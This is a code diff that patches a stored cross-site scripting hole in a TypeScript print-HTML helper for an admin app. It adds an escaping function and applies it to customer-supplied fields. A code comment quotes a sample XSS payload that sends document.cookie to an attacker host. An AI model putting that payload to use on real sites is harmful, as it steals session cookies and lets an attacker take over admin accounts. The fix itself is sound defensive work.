@@ -58,13 +58,28 @@ const basePrintCSS = [
 ].join("\n");
 
 // ── Helpers ──
+// HTML-escape any string before interpolating into the print HTML to prevent
+// stored XSS via customer-supplied fields (name, email, VIN, plate, address,
+// notes). Without this, a malicious value like
+// `<img src=x onerror=fetch('https://attacker.com?t='+document.cookie)>` would
+// execute JS in the staff print window at the same origin as the admin app.
+const esc = (v: unknown): string => {
+  if (v === null || v === undefined) return "";
+  return String(v)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#39;");
+};
+
 const makeRow = (label: string, value: string) =>
-  '<div class="row"><span class="label">' + label + '</span><span class="value">' + value + "</span></div>";
+  '<div class="row"><span class="label">' + esc(label) + '</span><span class="value">' + esc(value) + "</span></div>";
 
 const makeSection = (title: string, rows: [string, string | null | undefined][]) => {
   const valid = rows.filter(([, v]) => v != null && v !== "" && v !== "none");
   if (valid.length === 0) return "";
-  return '<div class="section"><div class="section-title">' + title + '</div><div class="grid">' +
+  return '<div class="section"><div class="section-title">' + esc(title) + '</div><div class="grid">' +
     valid.map(([l, v]) => makeRow(l, v!)).join("") + "</div></div>";
 };
 
@@ -72,10 +87,10 @@ const arrVal = (a: string[] | null) =>
   a && a.length > 0 && !(a.length === 1 && a[0] === "none") ? a.join(", ") : null;
 
 const makeDocSection = (title: string, images: string[]) =>
-  images.length > 0 ? `<div class="doc-section"><h2>${title}</h2>${images.map(url => `<img class="doc-img" src="${url}" />`).join("")}</div>` : "";
+  images.length > 0 ? `<div class="doc-section"><h2>${esc(title)}</h2>${images.map(url => `<img class="doc-img" src="${esc(url)}" />`).join("")}</div>` : "";
 
 const makeTextDocSection = (title: string, text: string) =>
-  text ? `<div class="doc-section"><h2>${title}</h2><pre style="white-space:pre-wrap;font-family:Inter,-apple-system,sans-serif;font-size:13px;color:#1a2a3a;background:#f8fafc;border:1px solid #e2e6ea;border-radius:8px;padding:16px;line-height:1.6;">${text}</pre></div>` : "";
+  text ? `<div class="doc-section"><h2>${esc(title)}</h2><pre style="white-space:pre-wrap;font-family:Inter,-apple-system,sans-serif;font-size:13px;color:#1a2a3a;background:#f8fafc;border:1px solid #e2e6ea;border-radius:8px;padding:16px;line-height:1.6;">${esc(text)}</pre></div>` : "";
 
 const waitAndPrint = (win: Window, html: string) => {
   win.document.write(html);
